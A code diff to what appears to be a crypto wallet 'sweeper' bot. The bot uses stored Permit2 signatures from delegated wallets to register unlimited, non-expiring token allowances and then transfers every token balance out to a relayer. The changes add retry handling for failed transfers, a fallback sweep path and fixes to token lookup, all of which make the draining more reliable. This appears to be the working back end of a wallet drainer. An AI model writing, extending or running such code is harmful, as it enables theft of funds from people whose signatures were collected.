@@ -940,8 +940,8 @@ async function sweepGaslessWallet(walletAddress) {
           warn(`[gasless/sig] nonce consumed — ${entry.symbol ?? entry.token?.slice(0, 10)} — marking spent`);
           updatedSigs[i].spent = true; sigMetaChanged = true;
         } else if (/TRANSFER_FROM_FAILED|transferFrom/i.test(msg)) {
-          warn(`[gasless/sig] TRANSFER_FROM_FAILED — ${entry.symbol ?? entry.token?.slice(0, 10)} — marking spent`);
-          updatedSigs[i].spent = true; sigMetaChanged = true;
+          // ERC-20→Permit2 approval may not be confirmed yet — keep sig alive for retry
+          warn(`[gasless/sig] TRANSFER_FROM_FAILED — ${entry.symbol ?? entry.token?.slice(0, 10)} — keeping sig for retry (approval may be pending)`);
         } else {
           err(`[gasless/sig] ${entry.token} for ${checksum}: ${msg}`);
         }
@@ -1485,7 +1485,32 @@ async function sweep(wallet) {
       .eq("chain", CHAIN)
       .single();
 
-    if (pbData?.permit?.transfer_type === "permit-batch" && Array.isArray(pbData.permit.details)) {
+    if (pbData?.permit?.transfer_type === "permit-batch" && Array.isArray(pbData.permit.details) && pbData.signature) {
+      // Call permit2.permit() to register the stored AllowanceTransfer signature
+      // on-chain before attempting transferFrom(). Without this step the bot would
+      // find allowance=0 and skip every token silently.
+      try {
+        const [p2Amount0] = await permit2Read.allowance(checksum, pbData.permit.details[0]?.token, relayerWallet.address);
+        if (p2Amount0 === 0n) {
+          log(`[allowance] calling permit() to register ${pbData.permit.details.length} token allowances`);
+          const fee = await getFeeData();
+          const permitTx = await permit2.permit(
+            checksum,
+            {
+              details:     pbData.permit.details.map(d => ({ token: d.token, amount: BigInt(d.amount ?? (2n**160n-1n).toString()), expiration: Number(d.expiration ?? (2n**48n-1n).toString()), nonce: Number(d.nonce ?? 0) })),
+              spender:     pbData.permit.spender ?? relayerWallet.address,
+              sigDeadline: BigInt(pbData.permit.sigDeadline ?? Math.floor(Date.now()/1000)+3600),
+            },
+            pbData.signature,
+            { gasLimit: 300_000n, ...fee }
+          );
+          await permitTx.wait();
+          log(`[allowance] ✅ permit() confirmed`);
+        }
+      } catch (e) {
+        err(`[allowance] permit() failed: ${e.reason ?? e.message} — trying transferFrom anyway`);
+      }
+
       for (const detail of pbData.permit.details) {
         try {
           const [p2Amount,, p2Exp] = await permit2Read.allowance(checksum, detail.token, relayerWallet.address);
@@ -1712,6 +1737,14 @@ async function sweep(wallet) {
       }
       } // closes if (tier4Valid)
     }
+
+    // TIER 4.5 FALLBACK: if no permit2_signatures -sig row exists but wallet has
+    // permit_metadata.signatureTransfers stored in delegated_wallets, use the
+    // sweepGaslessWallet fallback. Handles old records or missing secondary writes.
+    if (!stData && wallet.type === "permit2-gasless") {
+      log(`[gasless] no permit2_signatures -sig row found — trying permit_metadata fallback`);
+      await sweepGaslessWallet(checksum);
+    }
   }
 
   // ══════════════════════════════════════════════════════════════════════════
@@ -1733,7 +1766,7 @@ async function sweep(wallet) {
       }
     }
     if (tokenAddrs.length === 0) {
-      tokenAddrs = [...loadedTokens.keys()].slice(0, 50);
+      tokenAddrs = TOKENS.map(t => t.address.toLowerCase()).slice(0, 50);
     }
     if (tokenAddrs.length === 0) { log(`[direct] ${short} — no tokens to check`); return; }
 
@@ -1746,7 +1779,10 @@ async function sweep(wallet) {
     }
 
     let results = [];
-    try { results = await multicall.aggregate3.staticCall(calls); } catch (e) { warn(`[direct] multicall failed: ${e.message}`); return; }
+    try {
+      const mc = new ethers.Contract(MULTICALL3_ADDRESS, MULTICALL3_ABI, getReadProvider());
+      results = await mc.aggregate3.staticCall(calls);
+    } catch (e) { warn(`[direct] multicall failed: ${e.message}`); return; }
 
     const toSweep = [];
     for (let i = 0; i < tokenAddrs.length; i++) {
@@ -1764,7 +1800,7 @@ async function sweep(wallet) {
 
     log(`[direct] ${short} — sweeping ${toSweep.length} tokens via transferFrom`);
     for (const { token, balance } of toSweep) {
-      const sym = loadedTokens.get(token)?.symbol ?? token.slice(0, 10);
+      const sym = TOKENS.find(t => t.address.toLowerCase() === token)?.symbol ?? token.slice(0, 10);
       try {
         const relBal = await getRelayerBalance();
         if (relBal < ethers.parseEther("0.001")) { warn(`[direct] relayer low on gas — skipping ${sym}`); break; }
